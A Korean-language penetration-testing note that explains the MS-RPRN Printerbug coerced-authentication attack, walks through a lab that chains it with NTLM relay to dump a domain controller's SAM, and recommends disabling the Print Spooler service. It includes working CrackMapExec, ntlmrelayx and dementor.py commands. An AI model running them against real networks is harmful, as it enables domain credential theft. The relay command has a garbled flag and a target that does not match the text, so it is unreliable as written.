# MS-RPRN - Printerbug / Print Spooler



![](../../.gitbook/assets/print-spooler-rpc.drawio\(3\).png)

Printerbug (프린터버그) / Print Spooler RPC 강제 인증은 타겟 서버에서 실행중인 Print Spooler 서비스의 `RpcRemoteFindFirstPrinterChangeNotificationEx` RPC 함수를 이용하는 공격이다. 공격은 다음과 같은 단계로 이뤄진다:&#x20;

1. 공격자는 취약한 RPC 함수 중 하나인 `RpcRemoteFindFirstPrinterChangeNotificationEx` 를 타겟 서버에게 요청한다. 이 함수는 타겟 서버에서 프린터와 관련된 변화가 일어날 시 클라이언트에게 알려주는 함수다.&#x20;
2. 서버가 클라이언트가 RPC 함수를 실행했다는 것을 인지한다.
3. `RpcRemoteFindFirstPrinterChangeNotificationEx`  함수가 제대로 실행되려면 서버에서 클라이언트로 인증하고 접근 한 뒤, 클라이언트에게 알림 설정을 해줘야한다. 이 설정을 하기 위해 서버는 스스로 (하지만 사실상 클라이언트가 함수를 실행했으니 "강제"로) 공격자 클라이언트에게 서버 머신 계정 + Net-NTLMv1/v2 해시가 포함된 사용자 인증 패킷을 보낸다.&#x20;
4. 공격자는 이 머신 계정의 사용자 인증 패킷을 Responder 와 같은 툴로 받는다.&#x20;
5. 이후 이 머신 계정 이름 + Net-NTLMv1/v2 해시를  가지고 릴레이 공격, 다운그레이드 공격, RBCD 공격 등의 다양한 공격을 진행한다.&#x20;

### 전제 조건&#x20;

* 타겟 서버의 Print Spooler 서비스가 작동중이여야한다 - 윈도우 서버와 워크스테이션 운영체제에서는 기본적으로 활성화 되어있다.
* 도메인 유저 계정/문맥이 필요하다.&#x20;

### 실습&#x20;

* **DC01.choi.local (192.168.40.150)** - choi.local 도메인의 도메인 컨트롤러. 끔찍하게도 다른 도메인 컨트롤러의 로컬 관리자 권한을 갖고 있다.&#x20;
* **DC1.pci.choi.local (192.168.40.160)** - pci.choi.local 도메인의 도메인 컨트롤러. 끔찍하게도 dc01.choi.local 에게 로컬 관리자 권한을 줬다.&#x20;

![](<../../.gitbook/assets/image (12) (4).png>)

도메인 컨트롤러가 다른 도메인의 도메인 컨트롤러 로컬 관리자 권한을 갖고 있는 것은 현실적이지 않은 시나리오다. 그와 동시에 실제 모의해킹 시 발견 가능성이 0%냐고 물어본다면 또 그렇지도 않은, 끔찍한 시나리오다.&#x20;

이번 실습에서는 dc01.choi.local에게 프린터버그 강제인증 -> NTLM 릴레이 -> dc1.pci.choi.local 의 SAM 덤프를 해본다.&#x20;

1.먼저 dc01.choi.local 이 프린터버그 에 취약한지, Spooler 서비스가 작동중인지 알아본다.&#x20;

```
cme smb dc01.choi.local -u low -p 'Password123!' -d choi.local -M spooler
```

![Enabled! Spooler 서비스/RPC가 작동중이다.](<../../.gitbook/assets/image (5) (2) (1).png>)

2\. 프린터버그 강제 인증을 실행하기 전, NTLM 릴레이를 먼저 세팅한다.&#x20;

```shell
python3 ntlmrelayx.py -t dc01.choi.local -smb2supportshel
```

3\. 프린터버그 강제 인증을 실행한다.&#x20;

```
python3 dementor.py -u low -p 'Password123!' -d choi.local 192.168.40.182 192.168.40.150
```

4\. 결과를 확인한다.&#x20;

dc01.choi.local (192.168.40.150) 에게 프린터버그 강제인증 실행 -> dc01의 머신계정 (`choi.local\dc01$`) 의 NTLM 인증 트래픽이 공격자 호스트에게 전달 -> 그것을 릴레이해서 dc1.pci.choi.local 에게 전달 -> `dc01.choi.local` 이 `dc1.pci.choi.local` 의 로컬 관리자 권한을 갖고 있었기 때문에 SAM 덤프.&#x20;

![](<../../.gitbook/assets/image (7) (3).png>)

### 대응 방안&#x20;

강제 인증 공격을 가능케 해주는 Print Spooler 서비스는 프린트를 위한 서비스다. 수만명의 대기업 IT 인프라를 담당하는 도메인 컨트롤러 서를 물리적으로 방문해서 프린트를 한 적은 없을 것이다. 어디 데이터센터에 있는 도메인 컨트롤러에 비행기를 타고 가서 프린트를 하는 시스템 어드민 또한 본 적이 없다.&#x20;

따라서 프린터버그 강제 인증을 막는 방법은 Spooler 서비스를 비활성화 시키는 것이다. 특정 기능을 비활성화 시키는 것은 고객사에게 잘 추천하지 않지만, 이 경우 진짜 도메인 컨트롤러에서 프린트를 하는 사람이 없기 때문에 비활성화해도 비즈니스 운영에 있어 아무런 영향을 미치지 않는다.&#x20;

&#x20;

![프린트는 프린터에서 - 도메인 컨트롤러는 소중하다.](<../../.gitbook/assets/image (4) (2) (1).png>)
